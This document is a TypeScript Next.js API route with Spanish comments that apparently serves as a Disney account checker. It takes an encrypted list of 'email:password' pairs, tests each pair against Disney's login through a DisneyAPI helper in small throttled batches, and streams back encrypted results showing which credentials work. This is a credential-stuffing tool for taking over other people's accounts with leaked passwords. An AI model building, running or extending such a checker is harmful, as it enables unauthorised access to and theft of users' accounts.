import { NextResponse } from 'next/server';
import { DisneyAPI } from '../../../utils/disney/disneyApi';
import { encrypt, decrypt } from '../../../utils/encryption';

const BATCH_SIZE = 2; // Procesar cuentas en lotes pequeños

export async function POST(request: Request) {
  const encoder = new TextEncoder();

  try {
    // Desencriptar los datos recibidos
    const encryptedData = await request.text();
    console.log('📦 Datos encriptados recibidos');
    
    let accounts: string[];
    try {
      const decryptedData = decrypt(encryptedData);
      console.log('🔓 Datos desencriptados');
      accounts = JSON.parse(decryptedData);
    } catch (decryptError) {
      console.error('❌ Error al desencriptar/procesar datos:', decryptError);
      throw new Error('Error al desencriptar los datos');
    }

    // Validar que accounts sea un array
    if (!Array.isArray(accounts)) {
      const errorResponse = encrypt(JSON.stringify({ error: 'El formato de entrada debe ser un array de cuentas' }));
      return new Response(errorResponse, {
        status: 400,
        headers: { 'Content-Type': 'text/plain' }
      });
    }

    const stream = new TransformStream();
    const writer = stream.writable.getWriter();

    const sendResult = async (result: any) => {
      const encryptedResult = encrypt(JSON.stringify({ result }));
      const data = encoder.encode(`data: ${encryptedResult}\n\n`);
      await writer.write(data);
    };

    // Procesar cuentas en lotes
    (async () => {
      try {
        for (let i = 0; i < accounts.length; i += BATCH_SIZE) {
          const batch = accounts.slice(i, i + BATCH_SIZE);
          console.log(`🔄 Procesando lote ${Math.floor(i/BATCH_SIZE) + 1} de ${Math.ceil(accounts.length/BATCH_SIZE)}`);
          
          // Procesar cada cuenta en el lote actual
          const batchPromises = batch.map(async (account) => {
            const [email, password] = account.split(':');
            if (!email || !password) {
              return {
                account,
                success: false,
                error: 'Formato inválido'
              };
            }

            try {
              const api = new DisneyAPI();
              const result = await api.checkAccount(email, password);
              return {
                account,
                ...result
              };
            } catch (error: any) {
              return {
                account,
                success: false,
                error: error.message || 'Error al verificar la cuenta'
              };
            }
          });

          // Esperar a que se completen todas las verificaciones del lote
          const batchResults = await Promise.all(batchPromises);
          
          // Enviar resultados del lote
          for (const result of batchResults) {
            await sendResult(result);
          }

          // Pequeña pausa entre lotes para evitar sobrecarga
          if (i + BATCH_SIZE < accounts.length) {
            await new Promise(resolve => setTimeout(resolve, 1000));
          }
        }
      } catch (error) {
        console.error('Error en el stream:', error);
      } finally {
        await writer.close();
      }
    })();

    return new Response(stream.readable, {
      headers: {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive'
      }
    });
  } catch (error: any) {
    const errorResponse = encrypt(JSON.stringify({ 
      error: `Error al procesar la solicitud: ${error.message}` 
    }));
    
    return new Response(errorResponse, {
      status: 500,
      headers: { 'Content-Type': 'text/plain' }
    });
  }
} 